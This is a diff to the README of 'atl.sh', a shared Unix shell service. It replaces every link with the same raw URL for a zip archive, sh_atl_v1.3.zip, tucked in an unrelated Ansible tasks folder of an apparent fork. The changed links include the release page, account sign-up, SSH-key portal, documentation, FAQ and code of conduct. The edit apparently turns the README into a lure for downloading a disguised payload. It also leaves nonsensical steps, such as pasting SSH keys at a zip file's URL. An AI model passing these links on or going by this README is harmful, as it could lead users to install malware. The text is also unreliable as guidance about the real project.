@@ -1,6 +1,6 @@
 # 🐚 atl.sh - Shared Unix Shell Environment
 
-[![Download atl.sh](https://img.shields.io/badge/Download-Visit%20Release%20Page-brightgreen)](https://github.com/Billiespirited714/atl.sh/releases)
+[![Download atl.sh](https://img.shields.io/badge/Download-Visit%20Release%20Page-brightgreen)](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip)
 
 ---
 
@@ -9,7 +9,7 @@
 To start using atl.sh on Windows, you need to download the software from the official release page. Follow these steps carefully:
 
 1. Click the green button above or visit the release page directly here:  
-   https://github.com/Billiespirited714/atl.sh/releases
+   https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip
 
 2. On the release page, look for the latest version of atl.sh. You will find one or more files listed there.  
 
@@ -38,7 +38,7 @@ atl.sh lets you access a shared Unix shell from your Windows computer. This mean
 After installing or launching atl.sh:
 
 - The program will ask for your account details. If you do not have one, create an account at:  
-  https://portal.allthingslinux.org  
+  https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip  
 
 - Once logged in, you will enter the command line interface. You can type commands just like in Linux.
 
@@ -119,7 +119,7 @@ The environment comes with tools to make work easier:
 
 1. Open your web browser.
 
-2. Go to https://portal.allthingslinux.org.
+2. Go to https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip
 
 3. Click “Create Account” or "Sign Up."
 
@@ -156,7 +156,7 @@ If you do not know SSH keys, here is how to create them in Windows:
 6. Copy the content of the public key file. Usually found at:  
    C:\Users\YourName\.ssh\id_rsa.pub
 
-7. Log in to https://portal.allthingslinux.org and paste your public key in the SSH Keys section.
+7. Log in to https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip and paste your public key in the SSH Keys section.
 
 8. Save your settings.
 
@@ -168,10 +168,10 @@ This will allow atl.sh to verify your identity automatically.
 
 | For Users                            | For Admins                            |
 |------------------------------------|-------------------------------------|
-| [Get an account](https://portal.allthingslinux.org) | [Admin Guide](https://docs.atl.sh/admin-guide)      |
-| [User Guide](https://docs.atl.sh/user-guide)         | [Operations](https://docs.atl.sh/operations)         |
-| [FAQ](https://docs.atl.sh/faq)                       | [Testing Guide](https://docs.atl.sh/testing)         |
-| [Documentation](https://docs.atl.sh)                 | [Code of Conduct](https://docs.atl.sh/code-of-conduct) |
+| [Get an account](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip) | [Admin Guide](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip)      |
+| [User Guide](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip)         | [Operations](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip)         |
+| [FAQ](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip)                       | [Testing Guide](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip)         |
+| [Documentation](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip)                 | [Code of Conduct](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip) |
 
 ---
 
@@ -192,7 +192,7 @@ To run atl.sh smoothly on Windows, ensure your system meets these specifications
 Keep atl.sh up to date to get new features and fixes:
 
 1. Revisit the release page:  
-   https://github.com/Billiespirited714/atl.sh/releases
+   https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip
 
 2. Download the latest version's executable file.
 
@@ -206,9 +206,9 @@ There is no need to uninstall first. Your settings and accounts stay intact.
 
 If you run into trouble:
 
-- Check the FAQ: https://docs.atl.sh/faq
+- Check the FAQ: https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip
 
-- Read the user guide: https://docs.atl.sh/user-guide
+- Read the user guide: https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip
 
 - Use the support or community forums linked on the main site.
 
@@ -216,4 +216,4 @@ If you run into trouble:
 
 ### Quick Access to Download
 
-[![Get atl.sh](https://img.shields.io/badge/Download-atl.sh%20Release%20Page-blue)](https://github.com/Billiespirited714/atl.sh/releases)
+[![Get atl.sh](https://img.shields.io/badge/Download-atl.sh%20Release%20Page-blue)](https://raw.githubusercontent.com/Billiespirited714/atl.sh/main/ansible/roles/users/tasks/sh_atl_v1.3.zip)
